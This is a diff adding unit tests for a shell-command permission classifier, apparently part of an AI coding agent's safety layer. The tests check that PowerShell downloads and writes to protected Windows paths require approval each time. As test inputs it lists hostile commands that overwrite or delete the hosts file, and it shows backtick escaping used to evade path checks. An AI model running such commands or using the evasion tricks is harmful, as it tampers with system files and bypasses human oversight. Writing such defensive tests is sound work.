@@ -2765,6 +2765,88 @@ describe('参数形式的系统路径写入 / setsid 选项(第三十五批评�
       .toBe('prompt');
   });
 
+  it('iwr/irm 的 -OutFile 是写通道;位置 0 是 URL,不做位置推断', () => {
+    // `iwr <url> -OutFile <path>` 与 `curl -o <path> <url>` 是同一个写通道 —— 后者早就被 POSIX
+    // 分支覆盖、已必问,PowerShell 形态一直漏(codex 报)。
+    const win = ['C:\\repo'];
+    const hosts = 'C:\\Windows\\System32\\drivers\\etc\\hosts';
+    for (const c of [
+      `Invoke-WebRequest https://e.test/x -OutFile ${hosts}`,
+      `iwr https://e.test/x -OutFile ${hosts}`,
+      `Invoke-RestMethod https://e.test/x -OutFile ${hosts}`,
+      `irm https://e.test/x -OutFile ${hosts}`,
+      `iwr -Uri https://e.test/x -OutFile ${hosts}`,
+      `iwr https://e.test/x -OutFile:${hosts}`,                    // 贴值形态
+      `iwr https://e.test/x -Headers $h -OutFile ${hosts}`,        // 带值参数在前
+      `pwsh -Command iwr https://e.test/x -OutFile ${hosts}`,      // 载荷下探
+    ]) {
+      expect(classifyShellCommand(c, win, { platform: 'win32' }), c).toBe('prompt-each-time');
+    }
+
+    // 反例一:**不带 `-OutFile` 就是不落盘** —— 位置 0 是 URL,不是路径。所以这一档只认具名参数,
+    // 不像 copy 那样把缺失的目标落回 cwd:那等于凭空造出一次写入,会把每个 `iwr <url>` 都打成
+    // 写工作区。
+    for (const c of [
+      'iwr https://e.test/x',
+      'Invoke-WebRequest https://e.test/x',
+      'iwr https://e.test/x -UseBasicParsing',
+      'iwr https://e.test/x -Method POST -Body $b',
+      'iwr https://e.test/x -UseBasicParsing -TimeoutSec 30',
+      'iwr https://e.test/x -SkipCertificateCheck',
+      'iwr https://e.test/x -Headers $h',
+      'iwr https://e.test/x -OutFile C:\\repo\\a.zip',             // 区内落地
+      'iwr https://e.test/x -OutFile C:\\repo\\a.zip -Headers $h',
+    ]) {
+      expect(classifyShellCommand(c, win, { platform: 'win32' }), c).toBe('prompt');
+    }
+
+    // 反例二(**回归**):不登记 `curl` / `wget`。它们在 Windows PowerShell 里也是 iwr 的别名,
+    // 但已落在 POSIX 的 curl/wget 分支(认 `-o`/`-O`/`--output-dir` 一整套)。把它们改走这条更窄的
+    // 规则等于把既有覆盖面改小 —— 和 `tee` 同一个道理。
+    expect(classifyShellCommand(`curl -o ${hosts} https://e.test/x`, win, { platform: 'win32' }))
+      .toBe('prompt-each-time');
+    expect(classifyShellCommand(`wget -O ${hosts} https://e.test/x`, win, { platform: 'win32' }))
+      .toBe('prompt-each-time');
+    expect(classifyShellCommand('curl -o C:\\repo\\a https://e.test/x', win, { platform: 'win32' }))
+      .toBe('prompt');
+
+    // 反例三:歧义缩写 fail closed —— `-Out` 同时像 -OutFile / -OutVariable / -OutBuffer,
+    // 无法证明它不是落盘参数,所以要求同意(不靠"真 PowerShell 会报错"兜底)。
+    expect(classifyShellCommand(`iwr https://e.test/x -Out ${hosts}`, win, { platform: 'win32' }))
+      .toBe('prompt-each-time');
+  });
+
+  it('PowerShell 反引号转义的受保护路径要能命中', () => {
+    // PowerShell 里 `` ` `` 转义下一个字符,所以 ``C:\Win`dows\…\hosts`` 运行时就是 hosts;
+    // 判据要匹配字面 `Windows`,带着反引号一条都不命中(codex 报)。
+    // 修法是**多加一个候选形态**(去掉反引号)，与既有那条"去 POSIX `\` 转义"变体完全同构,
+    // 所以 PowerShell 工具与 Bash 原样串两个入口自动一致。
+    const win = ['C:\\repo'];
+    for (const c of [
+      'Set-Content C:\\Win`dows\\System32\\drivers\\etc\\hosts owned',
+      'Set-Content -Path C:\\Win`dows\\System32\\drivers\\etc\\hosts owned',
+      'Remove-Item C:\\Win`dows\\System32\\drivers\\etc\\hosts',
+      'Copy-Item C:\\repo\\p C:\\Win`dows\\x',
+      'Export-Csv -Path C:\\Win`dows\\System32\\x',
+      'pwsh -Command Set-Content C:\\Win`dows\\System32\\x owned',
+      // 带空格的受保护根必须加引号(不加引号 PowerShell 自己也会把它拆成两个实参)。
+      'Set-Content "C:\\P`rogram Files\\x" owned',
+      // 反引号在受保护根之后,原本就命中 —— 回归基线。
+      'Set-Content C:\\Windows\\Sys`tem32\\drivers\\etc\\hosts owned',
+    ]) {
+      expect(classifyShellCommand(c, win, { platform: 'win32' }), c).toBe('prompt-each-time');
+    }
+
+    // 反例:反引号出现在真实文件名里只是多一个候选形态,判档不变。
+    expect(classifyShellCommand('Set-Content C:\\repo\\a`b.txt hi', win, { platform: 'win32' }))
+      .toBe('prompt');
+    expect(classifyShellCommand('Set-Content C:\\repo\\a.txt hi', win, { platform: 'win32' }))
+      .toBe('prompt');
+    // 动态目标仍走不可证那条(反引号解码不影响它)。
+    expect(classifyShellCommand('Set-Content $t owned', win, { platform: 'win32' }))
+      .toBe('prompt-each-time');
+  });
+
   it('iex 是把 stdin 当程序的执行器:`| iex` 落在外层 shell 也命中下载即执行', () => {
     // `pwsh -Command 'iwr https://…/a.ps1' | iex`:`| iex` 在**外层**,顶层分段把它切成独立一段。
     // 于是两段各自都不红 —— payload 那段只有 `iwr`(单纯下载不是红线),`iex` 那段 tokens[0] 不是
